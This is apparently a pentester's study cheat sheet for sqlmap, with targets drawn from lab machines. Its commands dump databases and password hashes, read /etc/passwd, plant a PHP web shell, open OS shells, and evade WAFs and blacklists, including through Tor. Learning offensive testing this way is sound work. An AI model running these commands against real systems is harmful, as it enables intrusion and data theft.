---
title: sqlmap - A tool for testing SQL injection
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting 
---
# sqlmap - A tool for testing SQL injection

[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.


```
# List supported SQL Injection Types
sqlmap -hh
```


## GET parameter

```bash
sqlmap -u ‘http://victim.site/view.php?id=112’ -p id --technique=U -parse-errors
# -u / --url: to indicate the target
# -p: to indicate an injectable parameter 
# --technique=U  //to indicate a UNION based SQL injection technique // E: error based  // 
# -b / --banner: banner of the database
# --tor: to use a proxy to connect to the target URL
# -v3: to see the payloads that sqlmap is using
# --flush-session: to refresh sessions
# --tamper: default tampers are in /usr/share/sqlmap/tamper
# --parse-errors: To parse the DBMS errors (if any) and displays them as part of the program run
# --current-user: It returns the current user in the database
```

## POST parameter

```bash
sqlmap -u <URL> --data=<POST string> -p parameter [options]
```

A nice trick here is utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. By pasting the clipboard content (Ctrl-V) into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command.


## PUT method

Also, if we wanted to specify an alternative HTTP method, other than GET and POST (e.g., PUT), we can utilize the option --method, as follows:

```shell-session
sqlmap -u www.target.com --data='id=1' --method PUT
```


## Using -r file

Capture the request with burpsuite and save it to a file.

```bash
# dump all
sqlmap -r nameoffiletoinject --dump-all --exclude-sysdbs

# Get all databases
sqlmap -r nameoffiletoinject --method POST --data "parameter=lala" -p parameter --dbs    

# Get all tables 
sqlmap -r nameoffiletoinject --tables

# Get all columns of a given database dwva
sqlmap -r nameoffiletoinject --current-db dwva -columns

# Get all tables of a given database, for example dwva
sqlmap -r nameoffiletoinject -D dwva --tables

# Get all columns of a given table in a given database
sqlmap -r nameoffiletoinject -D dwva -T users --columns

# Dump users table
sqlmap -r nameoffiletoinject -D dwva -T users --dump

# To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the --start and --stop options (e.g., start from 2nd up to 3rd entry), as follows:
sqlmap -r nameoffiletoinject --dump -T users -D dwva --start=2 --stop=3

# Conditional Enumeration: column name starting with f.
sqlmap -r nameoffiletoinject --dump -T users -D testdb --where="name LIKE 'f%'"

# Return the row of the user with the name Kimberly
sqlmap -r nameoffiletoinject --dump --columns --where="name LIKE 'Kimberly%'" --batch

# Example: Search the name of column containing in the name the string style
sqlmap -r nameoffiletoinject --search -C style --batch

# Get columns username and password of table users from table dwva
sqlmap -r nameoffiletoinject -D dwva -T users -C username,password --dump

# Automatically attempt to upload a web shell using the vulnerable parameter and execute it
sqlmap -r nameoffiletoinject -p vuln-param -os-shell 

# Alternatively use the os-pwn option to gain a shell using meterpreter or vnc 
sqlmap -r nameoffiletoinject -p vuln-param -os-pwn 
```

>Tip: to indicate  within the saved request file which parameter we want to inject, use an asterisk (`*`), such as '/?id=*'.

## Using URL

You can also provide the url with --url or -u

```bash
sqlmap --url ‘http://victim.site’  --dbs --batch //
sqlmap --url ‘http://victim.site’  --users // gets users
sqlmap --url ‘http://victim.site’  --tables // gets all tables
sqlmap --url ‘http://victim.site’  --batch //


# Check what users we have and which privileges that user has.
sqlmap -u $IP/path.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --users

# Dump the password hash for an user (postgres in the example) and exploit that super permission.
sqlmap -u http://10.129.95.174/dashboard.php --forms -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 -U postgres --password --batch

# Get a shell 
sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o" --batch --os-shell       

# Enumeration usually starts with the retrieval of the basic information:
# Database version banner (switch `--banner`)
sqlmap -u http://10.129.95.174/dashboard.php --banner

# Current user name (switch `--current-user`)
sqlmap -u http://10.129.95.174/dashboard.php --current-user

# Current database name (switch `--current-db`)
sqlmap -u http://10.129.95.174/dashboard.php --current-db

# Checking if the current user has DBA (administrator) rights (switch `--is-dba`)
sqlmap -u http://10.129.95.174/dashboard.php --is-dba
```

Some switches:

```
# Escape detection. There is a switch --random-agent designed to randomly select a User-agent header value from the included database of regular browser values.
--random-agent

#  the `--mobile` switch can be used to imitate the smartphone by using that same header value. 
```

## Test headers

While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability.  The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`). 

Other headers: `--host`, 


## Proxying via Burpsuite


```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --proxy http://127.0.0.1:8080
```

## Getting a direct SQL Shell

```bash
# Checking for DBA Privileges
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
# Output:
# we need to get "current user is DBA: True", meaning that we may have the privilege to read local files.

# Reading Local Files
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
# Output: As we can see, SQLMap said `files saved` to a local file. We can `cat` the local file to see its content

# Writing Local Files
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
# Output: We see that SQLMap confirmed that the file was indeed written.


# A direct way to get an OS shell with SQLMap is by using the --os-shell option:
# Get a OS shell
sqlmap --url ‘http://victim.site’  --os-shell

# GEt a SQL shell
sqlmap --url ‘http://victim.site’  --sql-shell

# When there are different SQL injections but not all of them grant the oos-shell, be specific. For instance:
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

## Suffixes and preffixes

### Set a suffix

```
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### Prefix

```
sqlmap -u "http://example.com/?id=1"  -p id --prefix="') "
```


## Injections in Headers and other HTTP Methods


```
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```


## Common bypasses

```bash
# Upgrade level and risk options. 
# The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
sqlmap -u www.example.com/?id=1 -v 3 --level=5

# The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
sqlmap -u www.example.com/?id=1 --level=5 --risk=3

# Bypass Anti-CSRF Token
sqlmap -u www.example.com --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# Unique Value Bypass
sqlmap -u www.example.com/?id=1&rp=29125 --randomize=rp

# Calculated Parameter Bypass. A web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b"  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch

# IP Address Concealing. Using Tor
sqlmap -u "http://www.example.com" --tor --batch

# Checking out the use of tor with --check-tor 
sqlmap -u "http://www.example.com" --tor --batch --check-tor

# SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.
sqlmap -u "http://www.example.com" --skip-waf --batch 

# User-agent Blacklisting Bypass. In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).
sqlmap -u "http://www.example.com" --random-agent  --batch 


# --chunked, which splits the POST request's body into so-called "chunks."
sqlmap -u "http://www.example.com" --chunked  --batch 
```

## Advanced tuning

### Status code

For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between TRUE and FALSE responses could be used for detection purposes. If the difference between TRUE and FALSE responses can be seen in the HTTP codes (e.g. 200 for TRUE and 500 for FALSE), the option --code could be used to fixate the detection of TRUE responses to a specific HTTP code (e.g. --code=200).

```
sqlmap --method=PUT -u "http://example.com" --code=200
```

### Titles

If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.

### Strings

In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).


### Text only

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

### Techniques

The technique characters BEUSTQ refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

```
--technique=BEU
```

### UNION SQL tuning

If we know the number of columns, we can set  the option `--union-cols` (e.g. `--union-cols=17`).

In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).

## Tampers

List all tampers:

```bash
sqlmap --list-tampers
```

Basic syntax:

```
sqlmap -r request.txt --tamper=space2comment
# space2comment: changes whitespace to /**/
```


| Tamper                       | Description                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Replaces apostrophe character with its UTF-8 full width counterpart                                                                |
| apostrophenullencode.py      | Replaces apostrophe character with its illegal double unicode counterpart                                                          |
| appendnullbyte.py            | Appends encoded NULL byte character at the end of payload                                                                          |
| base64encode.py              | Base64 all characters in a given payload                                                                                           |
| between.py                   | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
| chardoubleencode.py          | Double url-encodes all characters in a given payload (not processing already encoded)                                              |
| commalesslimit.py            | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'                                                  |
| charencode.py                | Url-encodes all characters in a given payload (not processing already encoded)                                                     |
| charunicodeencode.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "%u0022"                           |
| charunicodeescape.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "\u0022"                           |
| equaltolike.py               | Replaces all occurances of operator equal ('=') with operator 'LIKE'                                                               |
| escapequotes.py              | Slash escape quotes (' and ")                                                                                                      |
| greatest.py                  | Replaces greater than operator ('>') with 'GREATEST' counterpart                                                                   |
| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword                                                                                   |
| ifnull2ifisnull.py           | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Embraces complete query with versioned comment                                                                                     |
| modsecurityzeroversioned.py  | Embraces complete query with zero-versioned comment                                                                                |
| multiplespaces.py            | Adds multiple spaces around SQL keywords                                                                                           |
| nonrecursivereplacement.py   | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters               |
| percentage.py                | Adds a percentage sign ('%') infront of each character                                                                             |
| overlongutf8.py              | Converts all characters in a given payload (not processing already encoded)                                                        |
| randomcase.py                | Replaces each keyword character with random case value                                                                             |
| randomcomments.py            | Add random comments to SQL keywords                                                                                                |
| securesphere.py              | Appends special crafted string                                                                                                     |
| sp_password.py               | Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs                                           |
| space2comment.py             | Replaces space character (' ') with comments                                                                                       |
| space2dash.py                | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')                        |
| space2hash.py                | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                      |
| space2morehash.py            | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                      |
| space2mssqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| space2mssqlhash.py           | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')                                          |
| space2mysqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| space2mysqldash.py           | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')                                            |
| space2plus.py                | Replaces space character (' ') with plus ('+')                                                                                     |
| space2randomblank.py         | Replaces space character (' ') with a random blank character from a valid set of alternate characters                              |
| symboliclogical.py           | Replaces AND and OR logical operators with their symbolic counterparts (&& and                                                     |
| unionalltounion.py           | Replaces UNION ALL SELECT with UNION SELECT                                                                                        |
| unmagicquotes.py             | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)             |
| uppercase.py                 | Replaces each keyword character with upper case value 'INSERT'                                                                     |
| varnish.py                   | Append a HTTP header 'X-originating-IP'                                                                                            |
| versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment                                                                    |
| versionedmorekeywords.py     | Encloses each keyword with versioned MySQL comment                                                                                 |
| xforwardedfor.py             | Append a fake HTTP header 'X-Forwarded-For'                                                                                        |


## Debugging

```
# To parse the DBMS errors (if any) and displays them as part of the program run, we have the flag `--parse-errors`
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --parse-errors

# The `-t` option stores the whole traffic content to an output file:
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

# Another useful flag is the -v option, which raises the verbosity level of the console output:
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```


Another option is proxying the traffic via Burpsuite

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --proxy http://127.0.0.1:8080
```
